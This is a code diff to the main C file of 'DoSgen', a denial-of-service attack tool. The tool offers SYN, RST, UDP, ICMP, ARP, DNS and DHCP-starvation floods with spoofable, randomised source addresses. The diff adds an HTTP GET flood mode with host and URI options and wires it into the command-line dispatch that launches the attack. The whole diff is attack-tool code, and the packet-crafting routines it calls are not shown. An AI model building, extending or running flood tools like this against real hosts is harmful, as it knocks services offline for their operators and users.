@@ -10,13 +10,14 @@ void print_help_and_die()
 {
     printf("/-----------------DoSgen usage-----------------/\n\n"
            "  Attacks:\n"
-           "\t--syn:\t SYN flood\n"
-           "\t--rst:\t RST flood\n"
-           "\t--udp:\t UDP flood\n"
-           "\t--icmp:\t ICMP flood\n"
-           "\t--arp:\t ARP flood\n"
-           "\t--dns:\t DNS flood\n"
-           "\t--dhcp:\t DHCP starvation\n\n"
+           "\t--syn:\t\t SYN flood\n"
+           "\t--rst:\t\t RST flood\n"
+           "\t--udp:\t\t UDP flood\n"
+           "\t--icmp:\t\t ICMP flood\n"
+           "\t--arp:\t\t ARP flood\n"
+           "\t--dns:\t\t DNS flood\n"
+           "\t--dhcp:\t\t DHCP starvation\n"
+		   "\t--http:\t\t HTTP GET flood\n\n"
            "  Definitions:\n"
            "\t-i:\t interface (e.g. eth0)\n"
            "\t-P:\t number of processes\n"
@@ -25,6 +26,8 @@ void print_help_and_die()
            "\t-S:\t source port\n"
            "\t-D:\t destination port\n"
            "\t-n:\t DNS name\n"
+		   "\t-H:\t Host name\n"
+		   "\t-U:\t URI\n"
            "\t-p:\t payload length\n"
            "\t-h:\t help, shows this message\n\n" );
     exit(100);
@@ -58,11 +61,7 @@ void syn_flood(int argc, char **argv)
 
     int c;
     opterr = 0;
-    
-	if (argc < 2) {
-		printf("\nYou have not specified enough arguments!\n -- Run again! --\n\n");
-		print_help_and_die();
-	}
+    	
 	// getopt() checks if following options were specified, ':' means that argument should follow options dsDSp/getopt() kontroluje zda byly specifikovany moznosti, ':' znamena, ze moznosti dsDSp by mel nasledovat nejaky argument
 	while ((c = getopt(argc, argv, "d:s:D:S:p:h")) != -1)
     {
@@ -531,7 +530,57 @@ void dhcp_flood(int argc, char **argv)
         printf("ERROR: %s\n", err);
     }
 }
-// Vstup: argc, argv. Výstup: flood_type_index, flood_argc
+
+//-------------------HTTP GET flood---------------------//
+void http_get_flood(int argc, char **argv)
+{
+	char *src_ip = "drnd(4)";
+	char *dst_ip = NULL;
+	char *host_name = NULL;
+	char *URI = NULL;
+	int payload_len = 0;
+	int c;
+
+	while((c = getopt(argc, argv, "s:d:H:U:p:h")) != -1)
+	{
+		switch(c)
+		{
+		case 's':
+			src_ip = optarg;
+			str_replace(src_ip, '.', ',');
+			break;
+		case 'd':
+			dst_ip = optarg;
+			str_replace(dst_ip, '.', ',');
+			break;
+		case 'H':
+            host_name = optarg;
+			break;
+		case 'p':
+            payload_len = atoi(optarg);
+            break;	
+		/*case 'U':
+			if(optarg == "/")
+			{	printf("nice");
+			URI = "/";}
+			URI = optarg;
+			printf("U also..\n");
+			break;*/
+		default:
+			printf("Something is missing!\n");
+			print_help_and_die();
+		}
+	}
+	char *err = prepare_http_get(src_ip, dst_ip, host_name, payload_len);
+
+	if (err != NULL)
+	{
+		printf("ERROR: %s\n", err);
+	}
+
+}
+
+// Vstup: argc, argv. Vystup: flood_type_index, flood_argc
 bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
 {
     while (1)
@@ -546,11 +595,10 @@ bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
         }
         (*flood_type_index)++;
     }
-    // Zisti počet args
     *flood_argc = 0;
     while (1)
     {
-        int flood_arg_index = *flood_type_index + 1 + *flood_argc;
+		int flood_arg_index = *flood_type_index + 1 + *flood_argc;
         if ((flood_arg_index >= argc) ||
                 (strncmp(argv[flood_arg_index], "--", 2) == 0))
         {
@@ -563,8 +611,10 @@ bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
 
 int main(int argc, char **argv)
 {
-    if (argc < 2)
-        print_help_and_die();
+	if (argc < 2) {
+		printf("\nYou have not specified enough arguments!\n -- Run again! --\n\n");
+		print_help_and_die();
+	}
 
     int argc_orig = argc;
     int i = 0;
@@ -608,13 +658,12 @@ int main(int argc, char **argv)
             print_help_and_die();
         }
     }
-    // Formátovanie
     char proc_num_str[10];
     sprintf(proc_num_str, "%u", proc_num);
     /*char pps_str[10];
     sprintf(pps_str, "%u", pps);*/
 
-    // Vymazanie dočasného súboru
+    // Deleting the tmp file/Vymazani docasneho souboru
     remove("tmp.cfg");
 
     argc = argc_orig;
@@ -628,8 +677,8 @@ int main(int argc, char **argv)
         optind = 0;
         opterr = 0;
         optopt = 0;
-
-        char *flood_type = argv[flood_type_index];
+        
+		char *flood_type = argv[flood_type_index];
         char **flood_argv = argv + flood_type_index;
 
         // SYN flood
@@ -667,7 +716,12 @@ int main(int argc, char **argv)
         {
             dhcp_flood(flood_argc + 1, flood_argv);
         }
-        else
+        // HTTP GET flood
+		else if (strcmp(flood_type, "--http") == 0)
+		{
+			http_get_flood(flood_argc + 1, flood_argv);
+		}
+		else
         {
             print_help_and_die();
         }
@@ -681,7 +735,7 @@ int main(int argc, char **argv)
         }
     }
 
-// Zahájenie útoku
+// Starting the atack/Zahajeni utoku
     start_attack(dev, proc_num_str); //pps_str
 }
 
